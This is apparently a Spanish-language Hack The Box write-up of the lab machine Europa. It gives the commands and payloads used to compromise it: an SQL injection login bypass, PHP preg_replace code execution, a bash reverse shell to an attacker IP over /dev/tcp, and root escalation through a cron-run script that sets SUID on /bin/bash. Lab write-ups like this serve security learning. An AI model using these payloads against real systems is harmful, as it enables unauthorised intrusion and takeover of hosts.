---
title: Writeup Europa
date: 2024-04-18 11:27:10 +/-TTTT
categories: [HTB]
tags: [linux, hackthebox, custom, medio]     # TAG names should always be lowercase

image:
  path: /assets/img/Posts/Europa/post_img.JPG
  alt: Writeup Europa
---

En el siguiente writeup de la maquina Europa se explotaran vulnerabilidades de sqlinjection, Server side Include y explotacion de Tareas Cron en una maquina Ubuntu.

### Enumeracion:

Iniciamos un reconocimiento de puertos con el siguiente nmap:

```shell
$sudo nmap -sS --min-rate 5000 -n -Pn -vvv --open -p- -oG allPorts 10.10.10.22
```

En lo personal usare la funcion extractPorts incluida en mi bashrc para extraer los puertos abiertos que nmap dejo en el archivo en formato grepeable. Al correr la utilidad vemos que tiene 3 puertos abiertos:

<div style="text-align:center">
    <img src="assets/img/Posts/Europa/ports.JPG" alt="" >
</div>

Ahora podemos hacer un analisis mas profundo de los servicios que corre cada puerto:

<div style="text-align:center">
    <img src="assets/img/Posts/Europa/nmapservices.JPG" alt="" >
</div>

Vemos que el servidor esta configurado para servir un virtualhost en el el dominio [www.europacorp.htb](www.europacorp.htb) asi que configuraremos nuestro /etc/hosts para que redirija todos las peticiones hacia ese subdominio a la ip de la maquina europa y asi el middleware de apache nos sirva el sitio correspondiente. Agregamos el siguiente codigo a el /etc/hosts:

```shell
10.10.10.22 europacorp.htb www.europacorp.htb admin-portal.europacorp.htb
```

Ahora si intetamos acceder a cada uno de las url con los nombres dns llegaremos siempre a la misma pagina. Pero como ser ve aca con Whatweb si hay un dominio que nos redirije a un panel de autenticacion en https://admin-portal.europacorp.htb/login.php.

<div style="text-align:center">
    <img src="assets/img/Posts/Europa/whatweb.JPG" alt="" >
</div>

Vemos que el panel tiene la siguiente forma y tiene pinta de ser creado por el dueno del sitio por lo que probaremos vulnerarlo manualmente con sql injections:

<div style="text-align:center">
    <img src="assets/img/Posts/Europa/panel.JPG" alt="" >
</div>

Usaremos burpsuite para probar diferente sqlis y encontrar una que funcione, finalmente las credenciales que funcionaron son email=admin@europacorp.htb' OR '1' = '1-- -&password=asd por lo tanto nos logueamos.

Luego dentro tenemos la seccion de tools que como se puede ver toma un string de entrada por nosotros y lo reemplaza en el texto que aparece en el sitio, y eso se hace en el servidor asi que probablemente el endpoint https://admin-portal.europacorp.htb/tools.php use un codigo inseguro para realizar el reemplazo:

Aqui tomamos el siguiente codigo url encodeado y para desencodearlo usamos Ctrl+shift+u seleccionando todo el texto que queremos modificar:

<div style="text-align:center">
    <img src="assets/img/Posts/Europa/url encoded.JPG" alt="" >
</div>

Queda como:

<div style="text-align:center">
    <img src="assets/img/Posts/Europa/urldesencoded.JPG" alt="" >
</div>

Como podemos ver la interfaz de usuario toma un string ingresado por nosotros en el cuadro superior y lo envia al servidor junto con el texto que aparece en el cuadro inferior que tambien podemos modificar. Y en el servidor se  reemplaza el texto del cuadro superior en todas las partes donde aparece ip_address en el cuadro inferior que son 2 partes. Esto probablemente lo haga con un preg_replace el cual es un codigo php inseguro ya que permite ejecutar codigo como explica el siguiente [articulo](https://bitquark.co.uk/blog/2013/07/23/)the_unexpected_dangers_of_preg_replace. Entonces enviamos el siguiente payload desde el burpsuite y vemos que tenemos ejecucion remota de comandos:

<div style="text-align:center">
    <img src="assets/img/Posts/Europa/payload.JPG" alt="" >
</div>

<div style="text-align:center">
    <img src="assets/img/Posts/Europa/response.JPG" alt="" >
</div>

Asi que lo que hacemos ahora es enviar la siguiente reverse shell con netcat:

```shell
system("bash -c 'bash -i >& /dev/tcp/10.10.14.3/6666 0>&1'")
```
Donde encodeamos los & por %26.

<div style="text-align:center">
    <img src="assets/img/Posts/Europa/reverseshellsend.JPG" alt="" >
</div>

Ahora tenemos una sesion en nuestra maquina atacante:

<div style="text-align:center">
    <img src="assets/img/Posts/Europa/wwwdatasession.JPG" alt="" >
</div>

### Escalada de privilegios

Es el momento de escala privilegios a root ya que podemos obtener la flag de usuario pero no acceder al directorio root como se ve a continuacion:

<div style="text-align:center">
    <img src="assets/img/Posts/Europa/escalada.JPG" alt="" >
</div>

Si leemos el archivo crontab vemos que cada minuto se esta ejecutando como root el programa clearlogs.

<div style="text-align:center">
    <img src="assets/img/Posts/Europa/crontab.JPG" alt="" >
</div>

El contenido de dicho programa es el siguiente:

```php
#!/usr/bin/php
<?php
$file = '/var/www/admin/logs/access.log';
file_put_contents($file, '');
exec('/var/www/cmd/logcleared.sh');
?>
```

Entonces ahora creamos el archivo logcleared.sh y le agregamos el siguiente codigo para que cuando clearlog lo ejecute como root entonces le asigne un bit suid al /bin/bash. Lo que permite hacer el SUID es ejecutar el programa con los privilegios del propietario en este caso root. 

```shell
#!/bin/bash
chmod u+s /bin/bash
```
Ademas podemos vigilar los privilegios del /bin/bash con ```watch -n 1 ls -l /bin/bash ``` y para cuando exactamente se cambie de minuto tendremos la bash con el suid por lo que iniciamos la bash como propietario para obtener root:

<div style="text-align:center">
    <img src="assets/img/Posts/Europa/obtaining root.JPG" alt="" >
</div>

